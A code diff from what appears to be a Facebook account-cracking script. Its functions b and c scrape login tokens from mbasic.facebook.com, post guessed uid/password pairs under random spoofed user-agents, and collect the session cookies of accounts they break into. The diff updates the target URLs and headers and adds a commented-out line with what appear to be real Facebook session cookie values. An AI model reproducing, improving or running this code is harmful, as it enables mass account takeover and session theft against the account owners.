@@ -476,7 +476,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -487,26 +487,14 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'd.facebook.com',
-    'method': 'page',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+     'method': 'GET',
     'scheme': 'https',
-    'x-fb-rlafr': '0',
-    'access-control-allow-origin': '*',
-    'facebook-api-version': 'v16.0',
-    'strict-transport-security': 'max-age=15552000',
-    'pragma': 'no-cache',
-    'cache-control': 'private, no-cache, no-store, must-revalidate',
-    'expires': 'Sat, 01 Jan 2000 00:00:00 GMT',
-    'x-fb-request-id': 'AYWTPWW6IizziKgxU5gXTWk',
-    'x-fb-trace-id': 'Hda5BM5MpK+',
-    'x-fb-rev': '1007465966',
-    'x-fb-debug': 'klKQ7tiJUxBy4N3shplDfHzZOI1USBuAOu2w9abcAr4xJCPI6NGdZfTo+nQPxne/uvYb1rl5rXyjuAw4UAZqqg==',
-    'date': 'Wed, 10 May 2023 07:20:43 GMT',
-    'alt-svc': 'h3=":443"; ma=86400',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    # 'cookie': 'datr=DJFrZACmEPDhgP8bScmboljX; sb=DJFrZAC9Gvg4n2bVSk7hl9ty; wd=421x816; fr=053mHtzmzEUoLs5F7..Bka5EV.5i.AAA.0.0.Bka5nL.AWUfu7NIH8c',
+    'sec-ch-ua': '"Google Chrome";v="88", "Chromium";v="88", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
@@ -514,8 +502,9 @@ def b(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
-            lo = session.post('https://d.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -543,7 +532,7 @@ def c(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -554,26 +543,14 @@ def c(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'd.facebook.com',
-    'method': 'page',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+     'method': 'GET',
     'scheme': 'https',
-    'x-fb-rlafr': '0',
-    'access-control-allow-origin': '*',
-    'facebook-api-version': 'v16.0',
-    'strict-transport-security': 'max-age=15552000',
-    'pragma': 'no-cache',
-    'cache-control': 'private, no-cache, no-store, must-revalidate',
-    'expires': 'Sat, 01 Jan 2000 00:00:00 GMT',
-    'x-fb-request-id': 'AYWTPWW6IizziKgxU5gXTWk',
-    'x-fb-trace-id': 'Hda5BM5MpK+',
-    'x-fb-rev': '1007465966',
-    'x-fb-debug': 'klKQ7tiJUxBy4N3shplDfHzZOI1USBuAOu2w9abcAr4xJCPI6NGdZfTo+nQPxne/uvYb1rl5rXyjuAw4UAZqqg==',
-    'date': 'Wed, 10 May 2023 07:20:43 GMT',
-    'alt-svc': 'h3=":443"; ma=86400',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    # 'cookie': 'datr=DJFrZACmEPDhgP8bScmboljX; sb=DJFrZAC9Gvg4n2bVSk7hl9ty; wd=421x816; fr=053mHtzmzEUoLs5F7..Bka5EV.5i.AAA.0.0.Bka5nL.AWUfu7NIH8c',
+    'sec-ch-ua': '"Google Chrome";v="88", "Chromium";v="88", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
@@ -581,8 +558,9 @@ def c(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
-            lo = session.post('https://d.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
